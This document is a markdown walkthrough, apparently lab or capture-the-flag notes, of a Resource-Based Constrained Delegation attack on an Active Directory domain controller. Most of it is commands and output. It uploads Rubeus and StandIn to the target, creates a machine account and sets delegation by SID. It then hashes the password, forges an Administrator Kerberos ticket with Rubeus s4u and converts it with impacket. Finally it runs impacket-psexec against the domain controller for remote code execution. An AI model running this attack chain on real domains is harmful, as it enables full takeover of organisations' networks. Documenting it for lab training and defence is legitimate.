# Resource-Based Constrained Delegation Attack

Allows us to create an machine account (Objects on the DC) & impersonate any user on the system.

---

## PoC

Download Rubeus.exe & StandIn.exe onto the target system.

```
upload /home/saitama/Desktop/Tools/ActiveDirectory/Rubeus/Rubeus.exe Rubeus.exe
upload /home/saitama/Desktop/Tools/ActiveDirectory/StandIn/Standin_v13_Net45.exe StandIn.exe
```

Next what we should do is execute StandIn, this will create an new computer account.

Note: Save the password which gets prompted after running the .exe

```
.\StandIn.exe --computer xct --make
```

We need to set an field in the next step so msds can act in our identity, in order to do this, we will need the SID of the created user account.

```
Get-ADComputer -Filter * | Select-Object Name, SID
```

So now we can utilize following command to set the attribute.

```
.\StandIn.exe --computer ResourceDC --sid S-1-5-21-537427935-490066102-1511301751-4101
```

The DC is now trusting this newly created account.

Now we can utilize Rubeus.exe in order to impersonate the Administrator Account & gain an TGT Ticket Hash.

Note: That Rubeus wants the RC4 Value, so we need to get the hash of the password of the user account we created, therefore we can use python3

Go on to your local machine & paste the following commands + ur password inside, in order to retrieve the hash value of the password.

```
python3                                               
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hashlib,binascii
>>> hash = hashlib.new('md4', "twecapuMwgSwlSs".encode('utf-16le')).digest()
>>> print(binascii.hexlify(hash))
b'fe5602353f6dfafbf5492535956e374a'
```

Let's run Rubeus.exe now.

```
.\Rubeus.exe s4u /user:xct /rc4:fe5602353f6dfafbf5492535956e374a /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /nowrap /ptt
```

Viewing the catched ticket provides us with the information that we do have an correct ticket for the administrator & for cifs, so we could technically psexec, but it doesn't actually work locally.

We need to take this base64 code and copy it to our machine and try to create an ticket locally & use it remotely.

```
C:\Users\L.Livingstone\Documents> klist

Current LogonId is 0:0x1a0209

Cached Tickets: (1)

#0> Client: administrator @ RESOURCED.LOCAL
 Server: cifs/resourcedc.resourced.local @ RESOURCED.LOCAL
 KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
 Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
 Start Time: 11/13/2025 6:10:29 (local)
 End Time:   11/13/2025 16:10:29 (local)
 Renew Time: 11/20/2025 6:10:29 (local)
 Session Key Type: AES-128-CTS-HMAC-SHA1-96
 Cache Flags: 0
 Kdc Called:
```
 
Save the ticket in an ticket.b64 file locally & base64 decode it afterwards and save it in an .kirbi file.


```
nano ticket.b64
cat ticket.b64 | base64 -d > ticket.kirbi
```

We now have to utilize "impacket-ticketConverter" to convert the .kirbi ticket to an .ccache file.
So we can use it remotely on linux.

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

We now need to export the ticket to the Kerberos variable

```
export KRB5CCNAME=./ticket.ccache

```

Note: Don't forget to add the DC/Domain to the target ip in /etc/hosts

```
impacket-psexec -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.246.175
```

If the Ticket isn't getting accepted, use the following command.

```
KRB5CCNAME=ticket.ccache impacket-psexec resourced.local/Administrator@resourcedc.resourced.local -k -no-pass
```




